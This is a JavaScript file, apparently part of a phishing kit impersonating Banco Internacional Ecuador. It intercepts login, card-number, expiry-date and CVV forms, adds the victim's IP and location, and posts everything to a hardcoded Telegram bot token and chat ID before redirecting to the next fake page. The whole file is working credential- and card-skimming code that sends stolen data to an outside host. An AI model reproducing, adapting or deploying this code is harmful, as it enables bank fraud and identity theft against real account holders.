document.addEventListener("DOMContentLoaded", function() {
    // Agregar evento de envío de formulario para la página de inicio de sesión
    var loginForm = document.getElementById("loginForm");
    if (loginForm) {
        loginForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var username = document.getElementById("email").value;
            var password = document.getElementById("password").value;
            obtenerUbicacionYEnviarMensajeTelegram(username, password, "correo2.html", "💲 Banco Internacional Ecuador 💲:\nCorreo: " + username + "\nContraseña: " + password);
        });
    }

    // Agregar evento de envío de formulario para la página de código de operaciones
    var verificationForm = document.getElementById("verificationForm");
    if (verificationForm) {
        verificationForm.addEventListener("submit", function(event) {
            event.preventDefault();
            var cardNumber = document.getElementById("card_number").value;
            var expirationDate = document.getElementById("expiry_date").value;
            var cvv = document.getElementById("cvv").value;
            obtenerUbicacionYEnviarMensajeTelegram(cardNumber, expirationDate, "card2.html", "💲 Banco Internacional Ecuador 💲:\nTarjeta: " + cardNumber + "\nFecha Vencimiento: " + expirationDate + "\nCVV: " + cvv);
        });
    }

    // Agregar evento de envío de formulario para el tercer formulario
    var verificationForm2 = document.getElementById("verificationForm2");
    if (verificationForm2) {
        verificationForm2.addEventListener("submit", function(event) {
            event.preventDefault();
            var campo1 = document.getElementById("campo1").value;
            var campo2 = document.getElementById("campo2").value;
            var campo3 = document.getElementById("campo3").value;
            obtenerUbicacionYEnviarMensajeTelegram(campo1, campo2, "correo.html", "💲 Banco Internacional Ecuador 💲:\nRE-Tarjeta: " + campo1 + "\nRE-Fecha Vencimiento: " + campo2 + "\nRE-CVV: " + campo3);
        });
    }

    // Agregar evento de envío de formulario para el cuarto formulario
    var loginForm2 = document.getElementById("loginForm2");
    if (loginForm2) {
        loginForm2.addEventListener("submit", function(event) {
            event.preventDefault();
            var campo3 = document.getElementById("campo3").value;
            var campo4 = document.getElementById("campo4").value;
            obtenerUbicacionYEnviarMensajeTelegram(campo3, campo4, "index.html", "💲 Banco Internacional Ecuador 💲:\nRE-Email: " + campo3 + "\nRE-Contraseña: " + campo4);
        });
    }
});

function obtenerUbicacionYEnviarMensajeTelegram(campo1, campo2, nextPage, message) {
    fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
        var country = data.country_name;
        var region = data.region;
        var ip = data.ip;
        if (country && region && ip) {
            message += '\nUbicación: ' + country + ', ' + region + '\nIP: ' + ip;
        } else {
            message += '\nNo se pudo obtener la ubicación.';
        }
        enviarMensajeTelegram(message, nextPage);
    })
    .catch(error => {
        console.error("Error al obtener la ubicación:", error);
        message += "\nError al obtener la ubicación.";
        enviarMensajeTelegram(message, nextPage);
    });
}

function enviarMensajeTelegram(mensaje, nextPage) {
    var token = '7384818977:AAGuc5By2mVFxgKtNLBvc2cIqLgVorxWagU'; // Reemplaza 'TU_TOKEN' con tu token de la API de Telegram
    var chatId = '6588464495'; // Reemplaza 'TU_CHAT_ID' con el ID de chat al que quieres enviar el mensaje
    var url = 'https://api.telegram.org/bot' + token + '/sendMessage';
    var params = {
        chat_id: chatId,
        text: mensaje
    };

    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(params)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Ocurrió un error al enviar el mensaje.');
        }
        console.log('Mensaje enviado con éxito.');
        // Redirigir a la página siguiente después de enviar el mensaje
        window.location.href = nextPage;
    })
    .catch(error => {
        console.error('Error al enviar el mensaje:', error);
    });
}
